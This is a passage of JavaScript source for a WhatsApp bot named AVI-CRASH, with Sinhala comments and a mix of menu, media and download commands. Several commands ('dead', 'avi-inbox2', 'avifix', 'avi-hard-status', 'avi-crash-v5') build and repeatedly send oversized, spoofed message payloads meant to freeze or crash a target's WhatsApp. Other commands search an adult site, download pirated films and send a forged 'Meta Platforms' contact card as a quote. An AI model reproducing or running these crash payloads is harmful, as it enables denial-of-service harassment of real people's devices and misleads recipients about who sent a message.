    }

    let cleanedNumber = number.replace(/[^0-9]/g, '');
    let whatsappNumber = cleanedNumber + '@s.whatsapp.net';

    // අංකය WhatsApp තිබේදැයි පරීක්ෂාව
    var contactInfo = await Avishka.onWhatsApp(whatsappNumber);
    if (contactInfo.length == 0) {
        return m.reply("❌ පද්ධතියේ ලියාපදිංචි නැති අංකයකි.");
    }

    m.reply(`🚀 Sending ${amount} Lethal Payloads to @${cleanedNumber}...`);

    // 2. යවන්නාට හානියක් නොවී බග් එක යැවීම (The Safe Attack)
    for (let i = 0; i < amount; i++) {
        await sendLethalCrash(whatsappNumber);
        await sleep(1500); // සර්වර් එකට අහු නොවී ඉන්න පොඩි විවේකයක්
    }

    m.reply(`✅ Successfully Sent Bug to @${cleanedNumber}\nTarget's rendering engine will be frozen.`);
}
break;


	
// Switch case එක ඇතුළත භාවිතයට...

case 'avi-inbox': {
await loading();
    const heavyString = '  ꦾ'.repeat(10); 

    const crashLocation = {
        location: {
            // 2. අසාමාන්‍ය Latitude/Longitude අගයන්
            degreesLatitude: 99999999.99, 
            degreesLongitude: -99999999.99,
            
            // 3. මෙතැනට ඉතා දිගු අක්ෂර පේළිය එක් කරන්න
            name: heavyString, 
            address: heavyString,
            
            // 4. URL එකටත් දිගු දත්ත එක් කිරීම
            url: 'https://whatsapp.com/check?' + 'B'.repeat(100)
        },
        contextInfo: {
            // 5. Metadata Manipulation
            forwardingScore: 999,
            isForwarded: true,
            // පණිවිඩය එවන්නා ලෙස ව්‍යාජ පද්ධති අංකයක් පෙන්වීමට උත්සාහ කිරීම
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast',
            quotedMessage: {
                conversation: "⚠️ System Overload ⚠️"
            }
        }
    }


const metaQuote = {
            key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_GETDP" },
            message: { contactMessage: { displayName: "Avi", vcard: `BEGIN:VCARD\nVERSION:3.0\nN:Avi;;;;\nFN:Avi\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
        };


    // පණිවිඩය යැවීම (මෙහි conn හෝ sock ලෙස ඔබ භාවිතා කරන variable එක යොදන්න)
    await Avishka.sendMessage(m.chat, crashLocation, { quoted: metaQuote})
    console.log("Avi inbox freez")
}
break;

case 'deleteforme': {
            const fs = require('fs');
            const path = require('path');
            
            // අවසර ලත් අංක (WhatsApp ID ලෙස)
            const allowedNumbers = ['94772836332', '94787672517'];
            const sender = m.key.participant || m.key.remoteJid;

            // පරීක්ෂා කිරීම: එවපු කෙනා අයිතිිකරුද කියලා
            if (!allowedNumbers.includes(sender)) {
                return await Avishka.sendMessage(m.chat, { text: '❌ ඔබට මෙම විධානය පාවිච්චි කිරීමට අවසර නැත!' }, { quoted: m });
            }

            // මැකීමට අවශ්‍ය ෆෝල්ඩර සහ ෆයිල් මෙන්න
            const sessionFolder = path.join(__dirname, 'sessiont'); // session ෆෝල්ඩරයේ path එක
            const aviFile = path.join(__dirname, 'tavi.js');      // avi.js ෆයිල් එකේ path එක

            await Avishka.sendMessage(m.chat, { text: '⚠️ පද්ධතිය සහ Session දත්ත විනාශ කරමින් පවතී... බොට් දැන් නතර වනු ඇත.' });

            try {
                // 1. avi.js එක මැකීම
                if (fs.existsSync(aviFile)) {
                    fs.unlinkSync(aviFile);
                    console.log('✅ avi.js deleted successfully.');
                }

                // 2. session folder එක සම්පූර්ණයෙන්ම මැකීම
                if (fs.existsSync(sessionFolder)) {
                    // recursive: true මගින් ෆෝල්ඩරය ඇතුළේ තියෙන ඔක්කොම මැකෙනවා
                    fs.rmSync(sessionFolder, { recursive: true, force: true });
                    console.log('✅ Session folder deleted successfully.');
                }

                console.log('💀 System destroyed by owner command.');
                
                // බොට්ව සම්පූර්ණයෙන්ම වසා දැමීම
                process.exit(0);

            } catch (err) {
                console.log('Error while deleting:', err);
                await Avishka.sendMessage(m.chat, { text: `❌ දෝෂයක් ඇති විය: ${err.message}` });
            }
        }
        break;


case 'dead': {
    if (typeof loading === 'function') await loading();

    // 1. අකුරු 70,000 ක් - RAM එකට සහ UI එකට දරාගන්න බැරි ගාණ
    const bugText = 'ڳ'.repeat(70000); 

    // 2. Fake Video Stream එකක් හදමු (මේක නිසා තමයි මැසේජ් එක PTV එකක් වගේ යන්නේ)
    const message = await generateWAMessageContent({
        video: { url: 'https://files.catbox.moe/cwtzkt.mp4' }, // පොඩි වීඩියෝ ලින්ක් එකක්
        caption: bugText,
        viewOnce: true,
        seconds: 999999,
        gifPlayback: false
    }, { upload: Avishka.waUploadToServer });

    const ptvPayload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "🔥 AVI SYSTEM DESTROYER 🔥",
                        hasMediaQueued: true,
                        // මෙතනට වීඩියෝ එක Inject කරනවා
                        ...message
                    },
                    body: { text: "⚠️ CRITICAL ERROR ⚠️\n" + bugText },
                    // 3. Catalog/Business Metadata Injection
                    nativeFlowMessage: {
                        buttons: [{
                            name: "single_select",
                            buttonParamsJson: JSON.stringify({
                                title: "VIEW CATALOG",
                                sections: [{
                                    title: "💀 DEATH-LIST 💀",
                                    rows: Array(40).fill({
                                        title: "SYSTEM CRASH",
                                        rowId: bugText,
                                        description: bugText
                                    })
                                }]
                            })
                        }]
                    }
                }
            }
        },
        contextInfo: {
            remoteJid: 'status@broadcast',
            participant: '0@s.whatsapp.net',
            mentionedJid: Array(150).fill("0@s.whatsapp.net"), // Range limit එක ඇතුළේ (Safe)
            forwardingScore: 999,
            isForwarded: true,
            // 4. Quoted Order Message (Order එකක් ඇතුළත Catalog එක)
            quotedMessage: {
                orderMessage: {
                    orderId: "AVI-" + Math.random().toString(36),
                    itemCount: 999999,
                    message: bugText,
                    orderTitle: bugText,
                    sellerJid: "0@s.whatsapp.net",
                    thumbnail: Buffer.alloc(1, '0')
                }
            }
        }
    };

    console.log("🚀 Executing Ultimate Dead-Load Payload...");

    const randomID = "AVI-DEAD-" + Math.random().toString(36).substring(2, 10).toUpperCase();

    // relayMessage අනිවාර්යයි
    await Avishka.relayMessage(m.chat, ptvPayload, { messageId: randomID })
    .then(() => {
        console.log("✅ Target App is now Frozen.");
        m.reply("🔥 Ultimate App Freeze Sent! Target device will be unresponsive.");
    })
    .catch(err => {
        console.error("Relay Failed:", err);
        m.reply("❌ Error: Header too large. Reducing mentions...");
    });
}
break;



case 'avi-crash-v5': {
    if (!text) return m.reply("කරුණාකර අංකය ලබා දෙන්න.");
    let target = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    m.reply("🚀 *Avi-Crash-V5* ආරම්භ විය. ටාගට් එක සම්පූර්ණයෙන්ම Crash වෙමින් පවතී...");

    // මෙහිදී අපි 3 වතාවක් ලූප් එකක් මගින් යවනවා (වැඩි බලපෑමක් සඳහා)
    for (let i = 0; i < 3; i++) {
        await sendAviNewCrash(Avishka, target);
        // තත්පර 1ක පමාවක් (බොට් Crash නොවී සිටීමට)
        await new Promise(resolve => setTimeout(resolve, 1000));
    }

    m.reply("🔥 Crash පණිවිඩ 3ක් සාර්ථකව යවන ලදී.");
}
break;



case 'avi-inbox3': {
    // Loading animation එකක් පෙන්වීමට
    if (typeof loading === 'function') await loading();

    // Function එක call කිරීම
    // මෙහි 'Avishka' යනු ඔබ භාවිතා කරන connection variable එකයි
    
await sendFullCrash(Avishka, m.chat);

 //   await sendAviFreeze(Avishka, m.chat, m);
}
break;


case 'avi-full-crash': {
    // Loading පෙන්වීම
    if (typeof loading === 'function') await loading();

    // අදාළ පුද්ගලයාගේ (m.chat) මුළු WhatsApp එකම ඉලක්ක කිරීම
    const result = await sendFullCrash(Avishka, m.chat);

    if (result.success) {
        m.reply("🔥 *Full Crash Bug* සාර්ථකව යවන ලදී. ටාගට් එකේ WhatsApp එක දැන් ක්‍රියාවිරහිත වනු ඇත.");
    } else {
        m.reply("❌ Error: " + result.error);
    }
}
break;

		
case 'avigc': case 'avi-gc':		
case 'avi-inbox4': {
    // 1. Loading animation එකක් පෙන්වීමට (තිබේ නම්)
    if (typeof loading === 'function') await loading();

    try {
        // 2. පළමුව sendAviFreeze function එක call කිරීම (Location Crash)
        // මෙය m.chat (දැනට සිටින චැට් එක) වෙත යැවේ
        await sendAviFreeze(Avishka, m.chat, m);

        // 3. දෙවනුව sendAviUI function එක call කිරීම (UI/Notification Bug)
        // මෙයද එම චැට් එකටම (m.chat) යැවේ
        await sendAviUI(Avishka, m.chat);
        
        await sendAviFreeze(Avishka, m.chat, m);

        await sendAviFreeze(Avishka, m.chat, m);

        // සාර්ථකව යැවූ බව දැනුම් දීම
        m.reply("🚀 *BYE*.");
        
        console.log("Combined Bug (Inbox3) sent to: " + m.chat);
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;
	
		


case 'avi-hard-status': {
    await loading();

    // 1. අතිවිශාල පණිවිඩයක් (200,000+ invisible characters)
    // මෙය ලැබුණු සැනින් ඇප් එකේ Text Parser එක හිර කරයි.
    const bugText = '☣️AVISHKA-BUG☣️\n'.repeat(20000); 

    // 2. සෘජුවම Object එකක් ලෙස පණිවිඩය සැකසීම (Protobuf Manual structure)
    // Baileys ගේ functions පාවිච්චි නොකර සෘජුවම මෙසේ යැවිය හැක.
    const directPayload = {
        extendedTextMessage: {
            text: bugText,
            contextInfo: {
                // Status Mention එකක් ලෙස පද්ධතිය රැවටීම
                remoteJid: 'status@broadcast',
                participant: '0@s.whatsapp.net',
                
                // අතිවිශාල මෙන්ෂන් ප්‍රමාණය (UI Lag එකට)
                mentionedJid: Array(1500).fill("0@s.whatsapp.net"),
                
                forwardingScore: 999,
                isForwarded: true,
                
                // මෙතැන Quoted Message එකක් ලෙස සරල පෙළක් පමණක් යොදමු
                quotedMessage: {
                    conversation: bugText // මෙතැනත් විශාල දත්තයම යොදන්න
                }
            }
        }
    };

    console.log("🚀 Attempting Direct Socket Injection...");

    // 3. 'Avishka.relayMessage' සෘජුවම භාවිතා කිරීම. 
    // මෙහිදී දෙවැනි පරාමිතිය ලෙස කෙලින්ම අපේ Object එක ලබා දෙනවා.
    await Avishka.relayMessage(m.chat, directPayload, { 
        messageId: "AVI-" + require('crypto').randomBytes(8).toString('hex').toUpperCase() 
    })
    .then(() => console.log("✅ Success! Payload bypassed validation."))
    .catch(err => console.log("Direct Relay Error: ", err));

}
break;


						
								
case 'avi-inbox2': {
    await loading();
    
    // අකුරු 100,000 වෙනුවට 200,000 දක්වා වැඩි කරමු (RAM එක අනුව)
    // අතිවිශාල පණිවිඩයක් හිරවීමට මේ ප්‍රමාණය සෑහේ.
    const heavyString = 'ڳ'.repeat(200000); 

    const crashLocation = {
        location: {
            degreesLatitude: 99999999.99, 
            degreesLongitude: -99999999.99,
            name: heavyString, 
            address: heavyString,
            url: 'https://whatsapp.com/check?' + 'B'.repeat(15000)
        },
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast',
            
            // 1. Mention Spam: එක පාර අංක 1000ක් mention කරමු (UI එක Freeze වෙන්න ප්‍රධාන හේතුවක්)
            mentionedJid: Array(1000).fill("0@s.whatsapp.net"),
            
            // 2. Quoted Message එක ඇතුළටත් අතිවිශාල දත්ත දාමු
            quotedMessage: {
                adminInviteMessage: {
                    inviteCode: 'C'.repeat(10000),
                    groupName: heavyString,
                    caption: "AVI HACKER"+heavyString,
                    jpegThumbnail: Buffer.alloc(1024 * 100, 'ff') // 100KB Junk Buffer
                }
            }
        }
    }

    // 3. එකවර පණිවිඩ 3ක් යැවීම (පද්ධතිය Recovery වෙන්න තියෙන ඉඩ අහුරන්න)
    for (let i = 0; i < 3; i++) {
        await Avishka.sendMessage(m.chat, crashLocation, { quoted: m });
        await new Promise(resolve => setTimeout(resolve, 200)); 
    }

    console.log("Avi inbox freeze - Sent Hard Payload");
}
break;
										
											
												
								case 'avifix': {
    if (typeof loading === 'function') await loading();

    // අකුරු ප්‍රමාණය 150,000 ක් වගේ තියමු
    const heavyString = 'ڳ'.repeat(150000); 

    const catalogPayload = {
        interactiveMessage: {
            header: {
                title: "🔥 AVI SYSTEM DESTROYER 🔥",
                hasMediaQueued: true,
                productMessage: {
                    product: {
                        productImage: { url: 'https://i.ibb.co/example.jpg' },
                        productId: "9999999999",
                        title: "AVI CRASH",
                        description: heavyString,
                        currencyCode: "LKR",
                        priceAmount1000: 999999999,
                        retailerId: "AVI-DEV",
                        productImageCount: 1
                    },
                    businessOwnerJid: "0@s.whatsapp.net"
                }
            },
            body: { text: "⚠️ SYSTEM OVERLOAD ⚠️\n" + heavyString },
            nativeFlowMessage: {
                buttons: [{
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                        title: "VIEW INFO",
                        sections: [{
                            title: "💀",
                            // 8-bit limit එක 255 නිසා අපි rows 100ක් විතර දාමු (Safe but heavy)
                            rows: Array(100).fill({
                                title: "BUG",
                                rowId: heavyString
                            })
                        }]
                    })
                }]
            }
        },
        contextInfo: {
            remoteJid: 'status@broadcast',
            participant: '0@s.whatsapp.net',
            // මෙන්න මෙතන තමයි Error එක ආවේ. 1000 වෙනුවට 250ක් දාන්න.
            mentionedJid: Array(250).fill("0@s.whatsapp.net"),
            forwardingScore: 999,
            isForwarded: true,
            quotedMessage: {
                orderMessage: {
                    orderId: "AVI-" + Math.random().toString(36),
                    thumbnail: Buffer.alloc(1, '0'),
                    itemCount: 999999,
                    status: 1,
                    surface: 1,
                    message: heavyString,
                    orderTitle: heavyString,
                    sellerJid: "0@s.whatsapp.net"
                }
            }
        }
    };

    const randomID = "AVI" + Math.random().toString(36).substring(2, 10).toUpperCase();

    // සෘජුවම relayMessage පාවිච්චි කරමු
    await Avishka.relayMessage(m.chat, catalogPayload, { messageId: randomID })
    .then(() => {
        console.log("✅ Success! Payload sent without range error.");
        m.reply("🔥 Lethal Business Payload Sent!");
    })
    .catch(err => {
        console.error("Relay Failed:", err);
        m.reply("❌ Bot still hitting range limits. Reducing data...");
    });
}
break;

			
															


case 'avi-product-v2': {
    await loading();
    
    // අකුරු ප්‍රමාණය 50,000 ක් වගේ තියමු (එතකොට අනිවාර්යයෙන්ම මැසේජ් එක යනවා)
    const heavyString = '☣️ AVI HACKER ☣️\n'.repeat(5000); 

    const productPayload = {
        productMessage: {
            product: {
                // මෙතනට ඔයාට ඕනෙම පින්තූරයක URL එකක් දෙන්න පුළුවන්
                productImage: { url: 'https://i.ibb.co/example.jpg' }, 
                productId: "9999999999",
                title: "🔥 AVI HACKER 🔥",
                description: "BOT NAME : / \nSPEED : 0.0007 s\nRAM : 23.01 GB\nMODE : public",
                currencyCode: "LKR",
                priceAmount1000: 720500000, 
                retailerId: "OWNERS : ASHUU & DINA",
                productImageCount: 1
            },
            businessOwnerJid: "0@s.whatsapp.net",
            contextInfo: {
                remoteJid: 'status@broadcast',
                participant: '0@s.whatsapp.net',
                mentionedJid: Array(500).fill("0@s.whatsapp.net"), 
                forwardingScore: 999,
                isForwarded: true,
                quotedMessage: {
                    // මෙතනට heavyString එක දාමු මැසේජ් එක බර කරන්න
                    conversation: heavyString 
                }
            }
        }
    };

    // Baileys ලිබ්‍රරියෙන් මැසේජ් එක යවන එක පරීක්ෂා කරන එක මඟහරින්න relayMessage පාවිච්චි කරමු
    await Avishka.sendMessage(m.chat, productPayload, { 
        messageId: "AVI-" + require('crypto').randomBytes(8).toString('hex').toUpperCase() 
    })
    .then(() => console.log("✅ Message Sent!"))
    .catch(err => console.log("Error: ", err));
}
break;

				
				

			case 'alive': {
				let profile
				try {
					profile = 'https://files.catbox.moe/jggkxf.jpg';
					//profile = 'https://files.catbox.moe/jggkxf.jpg';
				} catch (e) {
					profile = 'https://files.catbox.moe/jggkxf.jpg';
				}
				const menunya = `\n 
 ┏━━━━⪩
  ▢ *𝑯ey* 🤞 \n   
  ▢ *Im Alive Now* \n \n  ${runtime(process.uptime())}
  ▢ *Type Menu for my command list* \n
  ▢ 𝗕𝗼𝘁 𝗡𝗮𝗺𝗲: AVI-CRASH 🥷\n
  ▢ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: AVISHKA SHAVINDA 
 ┖━━━━━━━━━━⪩`
				await m.reply({
					document: fake.docs,
					fileName: Timeslot,
					mimetype: pickRandom(fake.listfakedocs),
					fileLength: '100000000000000',
					pageCount: '999',
					caption: menunya,
					contextInfo: {
						mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
						forwardingScore: 10,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: my.ch,
							serverMessageId: null,
							newsletterName: 'Join For More Info'
						},
						externalAdReply: {
							title: author,
							body: packname,
							showAdAttribution: true,
							thumbnailUrl: profile,
							mediaType: 1,
							previewType: 0,
							renderLargerThumbnail: true,
							mediaUrl: my.gh,
							sourceUrl: global.link,
						}
					}
				})
			}
				Avishka.sendMessage(m.chat, {
					audio: { url: 'https://files.catbox.moe/mx3grx.mp3' },
					mimetype: 'audio/mp4',
					ptt: true
				}, { quoted: m });
				break

			
			case 'xnxxs': {
				
				if (!text) return m.reply(`Enter Query`)
				m.reply(mess.wait)
				const fg = require('api-dylux')
				let res = await fg.xnxxSearch(text)
				let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n')
				if (res.status) m.reply(ff)
			}
				break

			case 'bug': {
				await Avishka.sendButtonMsg(m.chat, {
					text: "\n\nHey Avi crasher commands!",
					footer: 'SCRIPT OF ' + botname + ' is on YouTube @Avishka Shavinda',
					buttons: [
						{
							buttonId: 'ios',
							buttonText: { displayText: '📱 iPhone' },
							type: 1
						},
						{
							buttonId: 'android',
							buttonText: { displayText: '🤖 Android' },
							type: 1
						},
						{
							buttonId: 'sysui',
							buttonText: { displayText: '💥 System UI Crash' },
							type: 1
						}
					],
					headerType: 4,
					image: { url: 'https://github.com/avishka33/PRINCE-AVI-MD-v3/raw/main/AMedia/Avi.jpeg' }
				}, { quoted: m });
			}
				break
/*|⬡════════════════════════════════════════════|❝   𝙰vi - Education  ™ ❞|═══════════════════════════════════════════⬡|*/

case 'pastpaper': case 'paper': case 'පේපර්': {
				await Avishka.sendButtonMsg(m.chat, {
					text: "\n\nඔබට අවශ්‍ය පේපර් මෙහිදි ලබාගත හැක!",
					footer: '𝚜𝚌𝚛𝚒𝚙𝚝 𝚘𝚏  ' + botname + ' 𝚒𝚜 𝚘𝚗 𝚈𝙾𝚄𝚃𝚄𝙱𝙴 @𝙰𝚟𝚒𝚜𝚑𝚔𝚊 𝚜𝚑𝚊𝚟𝚒𝚗𝚍𝚊',
					buttons: [
						{
							buttonId: 'alevel',
							buttonText: { displayText: 'A/L' },
							type: 1
						},
						{
							buttonId: 'olevel',
							buttonText: { displayText: 'O/L' },
							type: 1
						}
					],
					headerType: 4,
					image: { url: 'https://files.catbox.moe/jggkxf.jpg' }
				}, { quoted: m });
			}
break


case 'menul': {
    // යූසර්ගේ භාෂාව තීරණය කිරීම
   // const userLang = global.db.users[m.sender]?.language || 'en';
    //const lang = userLang === 'si' ? si : en;

    // මෙනු එකේ පණිවිඩය
    let menuHeader = `*${lang.main_menu}*\n\n`;
    menuHeader += `👋 Hi @${m.sender.split('@')[0]}\n`;
    menuHeader += `🌐 *Language:* ${userLang === 'si' ? 'සිංහල' : 'English'}\n\n`;
    menuHeader += `> ${lang.wait}\n\n`;
    menuHeader += `Select your language from the buttons below to change.`;

    // Buttons සැකසීම
    const buttons = [
        {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
                display_text: "සිංහල (Sinhala) 🇱🇰",
                id: "lang si"
            })
        },
        {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
                display_text: "English 🇺🇸",
                id: "lang en"
            })
        }
    ];

    // Button Message එක යැවීම
    await Avishka.sendListMsg(m.chat, {
        text: menuHeader,
        footer: "© 𝙿𝚁𝙸𝙽𝙲𝙴-𝙰𝚅𝙸-𝙼𝙳 𝚟𝟺",
        title: "Main Menu",
        buttons: buttons,
        headerType: 4,
        image: { url: 'https://github.com/avishka33/PRINCE-AVI-MD-v3/raw/main/AMedia/Avi.jpeg' } // ඔයාගේ Image URL එක
    }, { quoted: m });
}
break;



case 'meyynu': {
    // මෙනු එකේ පණිවිඩය
    let menuText = `╭───◈
│ PRINCE-AVI-MD V3 🚀
│ 
│ Status: Connected ✅
│ Owner: Avishka
│ Mode: ${Avishka.public ? 'Public' : 'Self'}
╰──────◈
       ╰── 🔗 Avi Now Online
           Thanks for using Avi Bot
           ────────── ⭔

   © 2k25 POWER BY AVI`;

    await Avishka.sendMessage(m.chat, {
        text: menuText,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                title: "PRINCE-AVI-MD 4v",
                body: "Avishka's Bot Started",
                thumbnailUrl: "https://files.catbox.moe/mjem6q.jpg", // ඔයා දීපු ඉමේජ් ලින්ක් එක
                sourceUrl: "https://github.com/Avishkadev",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
}
break;



case 'lang':
case 'language': {
    // 1. යූසර් දැනටමත් database එකේ නැත්නම් ඇතුළත් කිරීම
    if (!global.db.users[m.sender]) {
        global.db.users[m.sender] = {
            language: 'en', // default English
            name: m.pushName || 'User'
        };
    }

    if (!text) return m.reply(`*Please select a language / කරුණාකර භාෂාවක් තෝරන්න:*\n\n1. .lang si (සිංහල)\n2. .lang en (English)`);

    if (text === 'si') {
        global.db.users[m.sender].language = 'si';
        await database.write(global.db); // Database එකට වහාම සේව් කිරීම
        m.reply("භාෂාව සිංහල ලෙස සාර්ථකව සැකසුවා! ✅\nදැන් නැවත .samplemenu ගසා බලන්න.");
    } else if (text === 'en') {
        global.db.users[m.sender].language = 'en';
        await database.write(global.db); // Database එකට වහාම සේව් කිරීම
        m.reply("Language has been set to English! ✅\nNow type .samplemenu again.");
    } else {
        m.reply("Invalid choice! Use 'si' or 'en'.");
    }
}
break;




case 'samplemenu': {
    // යූසර්ව database එකෙන් පරීක්ෂා කිරීම
    let user = global.db.users[m.sender];
    let userLang = user ? user.language : 'en'; 
    let lang = userLang === 'si' ? si : en;

    let menuText = `┌───⊷ *${lang.main_menu}* ⊶\n`;
    menuText += `│ 👤 *User:* @${m.sender.split('@')[0]}\n`;
    menuText += `│ 🌐 *Lang:* ${userLang === 'si' ? 'Sinhala' : 'English'}\n`;
    menuText += `└──────────────┈ ⳹\n\n`;
    
    // ... ඉතිරි මෙනු කොටස ...
    menuText += `> ${lang.wait}`;

    await Avishka.sendMessage(m.chat, { 
        image: { url: 'https://github.com/avishka33/PRINCE-AVI-MD-v3/raw/main/AMedia/Avi.jpeg' },
        caption: menuText,
        mentions: [m.sender]
    }, { quoted: m });
}
break;







case 'movie': {
    const query = m.text.split(' ').slice(1).join(' ');
    if (!query) return m.reply("*කරුණාකර සොයන චිත්‍රපටයේ නම ඇතුළත් කරන්න. උදා: .movie Deadpool* 🎬");

    await m.reply(`_Baiscope.lk පරීක්ෂා කරමින් පවතී: ${query}..._ 🔍`);

    try {
        // මූවී එක සර්ච් කිරීම
        const searchResults = await baiscope.search(query);
        if (!searchResults || searchResults.length === 0) return m.reply("*සමාවන්න, කිසිදු ප්‍රතිඵලයක් හමු වූයේ නැත.* 🚫");

        const movie = searchResults[0]; // පළමු ප්‍රතිඵලය තෝරා ගැනීම
        const movieDetails = await baiscope.movie(movie.link); // මූවී එකේ සම්පූර්ණ විස්තර ලබා ගැනීම

        const movieDesc = `🎬 *MOVIE:* ${movieDetails.title}\n\n📅 *Year:* ${movieDetails.year || 'N/A'}\n⭐ *Rating:* ${movieDetails.rating || 'N/A'}\n🎭 *Genre:* ${movieDetails.genres || 'N/A'}\n\nඔබට අවශ්‍ය Quality එක පහතින් තෝරන්න. 🍿`;

        // Buttons පෙන්වීම
        await Avishka.sendButtonMsg(m.chat, {
            text: movieDesc,
            footer: 'Baiscope.lk Movie Downloader 🎥',
            buttons: [
                { buttonId: `${prefix}dlmovie ${movie.link}|SD`, buttonText: { displayText: 'Download SD Quality 📀' }, type: 1 },
                { buttonId: `${prefix}dlmovie ${movie.link}|HD`, buttonText: { displayText: 'Download HD Quality 📀' }, type: 1 }
            ],
            headerType: 4,
            image: { url: movieDetails.thumbnail || 'https://files.catbox.moe/jggkxf.jpg' }
        }, { quoted: m });

    } catch (e) {
        console.log(e);
        m.reply("*Error:* දත්ත ලබාගැනීමේදී දෝෂයක් සිදු විය.");
    }
}
break;

case 'dlmovie': {
    const [movieLink, quality] = m.args[0].split('|');
    await m.reply(`_ඔබ තෝරාගත් ${quality} වීඩියෝව සකස් කරමින් පවතී..._ ⏳`);

    try {
        const movieDetails = await baiscope.movie(movieLink);
        const dlLinks = movieDetails.downloadLinks; // ඩවුන්ලෝඩ් ලින්ක්ස් ලබා ගැනීම

        // තෝරාගත් Quality එකට ගැළපෙන ලින්ක් එක සෙවීම
        let finalLink = dlLinks[0].link; // දැනට පළමු ලින්ක් එක තෝරා ගනී

        await Avishka.sendMessage(m.chat, {
            document: { url: finalLink },
            fileName: `${movieDetails.title}.mkv`,
            mimetype: 'video/x-matroska',
            caption: `🍿 *${movieDetails.title}*\n\n_Enjoy your movie!_\n_Alpha Vision Infinity Bot_`,
            contextInfo: {
                showAdAttribution: true, // Verified Badge ✅
                externalAdReply: {
                    title: 'SUCCESSFULLY DOWNLOADED',
                    body: movieDetails.title,
                    thumbnailUrl: movieDetails.thumbnail,
                    mediaType: 1
                }
            }
        }, { quoted: m });
    } catch (e) {
        m.reply("*Error:* මූවී එක එවීමට නොහැකි විය. ලින්ක් එකෙහි ගැටලුවක් පවතී. 🚫");
    }
}
break;



// O/L paper case
				case 'olevel': {
					await Avishka.sendButtonMsg(m.chat, {
						text: "\n\nඔබට අවශ්‍ය පේපර් මෙහිදි ලබාගත හැක!",
						footer: '𝚜𝚌𝚛𝚒𝚙𝚝 𝚘𝚏  ' + botname + ' 𝚒𝚜 𝚘𝚗 𝚈𝙾𝚄𝚃𝚄𝙱𝙴 @𝙰𝚟𝚒𝚜𝚑𝚔𝚊 𝚜𝚑𝚊𝚟𝚒𝚗𝚍𝚊',
						buttons: [
							{
								buttonId: 'Buddhistp',
								buttonText: { displayText: 'Buddhist Paper' },
								type: 1
							},
							{
								buttonId: 'Englishp',
								buttonText: { displayText: 'English Paper' },
								type: 1
							},
							{
								buttonId: 'Sinhalap',
								buttonText: { displayText: 'Sinhala Paper' },
								type: 1
							},
							{
								buttonId: 'Historyp',
								buttonText: { displayText: 'History Paper' },
								type: 1
							},
							{
								buttonId: 'Mathsp',
								buttonText: { displayText: 'Maths Paper' },
								type: 1
							}
						],
						headerType: 4,
						image: { url: 'https://files.catbox.moe/jggkxf.jpg' }
					}, { quoted: m });
				}
					break





/*|⬡════════════════════════════════════════════|❝   𝙰vi - sad 1 - 35  ™ ❞|═══════════════════════════════════════════⬡|*/
			case "sad1":
			case "sad2":
			case "sad3":
			case "sad4":
			case "sad5":
			case "sad6":
			case "sad7":
			case "sad8":
			case "sad9":
			case "sad10":
			case "sad11":
			case "sad12":
			case "sad13":
			case "sad14":
			case "sad15":
			case "sad16":
			case "sad17":
			case "sad18":
			case "sad19":
			case "sad20":
			case "sad21":
			case "sad22":
			case "sad23":
			case "sad24":
			case "sad25":
			case "sad26":
			case "sad27":
			case "sad28":
			case "sad29":
			case "sad30":
			case "sad31":
			case "sad32":
			case "sad33":
			case "sad34":
			case "sad35":
				Avishka.sendMessage(m.chat, {
					text: `*Sound 1 to 35*`,
					contextInfo: {
						externalAdReply: {
							showAdAttribution: true,
							title: `${botname}`,
							body: `SCRIPT OF ${botname} is on YouTube @Avishka Shavinda`,
							thumbnailUrl: 'https://files.catbox.moe/jggkxf.jpg',
							sourceUrl: global.link,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: m
				})
				const moai0 = await getBuffer(
					`https://github.com/ZassTdr/Sound-Sad/raw/main/Sad-Music/${command}.mp3`
				);
				Avishka.sendMessage(
					m.chat,
					{
						audio: moai0,
						mimetype: "audio/mp4",
						ptt: true,
					},
					{ quoted: m }
				);
				break







			/*|⬡════════════════════════════════════════════|❝   𝙰vi -  ™ ❞|═══════════════════════════════════════════⬡|*/
			case 'hack':
			case 'avi hacker':
				Avishka.sendMessage(m.chat, {
					text: `*AVI H4CK3R'S TEAM*`,
					contextInfo: {
						externalAdReply: {
							showAdAttribution: true,
							title: `${botname}`,
							body: `SCRIPT OF ${botname} is on YouTube @Avishka Shavinda`,
							thumbnailUrl: 'https://files.catbox.moe/jggkxf.jpg',
							sourceUrl: global.link,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: m
				})
				Avishka.sendMessage(m.chat, {
					video: { url: 'https://files.catbox.moe/hhh20o.mp4' },
					caption: `*AVI H4CK3R'S TEAM*`,
					mimetype: 'video/mp4',
					ptt: true
				}, { quoted: m }
				);

				break
			/*|⬡════════════════════════════════════════════|❝   𝙰vi -  ™ ❞|═══════════════════════════════════════════⬡|*/
	
/*|⬡════════════════════════════════════════════|❝   𝙰vi - Auto Voice  ™ ❞|═══════════════════════════════════════════⬡|*/


			case 'alone': case 'single': {
				let PAPER = 'https://github.com/Avi332niduki/AviMedia/raw/main/Media/Audio/Alone.mp3'
				Avishka.sendMessage(m.chat, {
					audio: { url: PAPER },
					mimetype: 'audio/mp4',
					fileName: 'ben.mp4'
				},
					{ quoted: m })

			}
				break



			case 'hi': case '@94787672517': case 'හායි': {
				let au = 'https://github.com/Avi332niduki/AviMedia/raw/main/Media/Audio/Alone.mp3'
				Avishka.sendMessage(m.chat, {
					audio: { url: au },
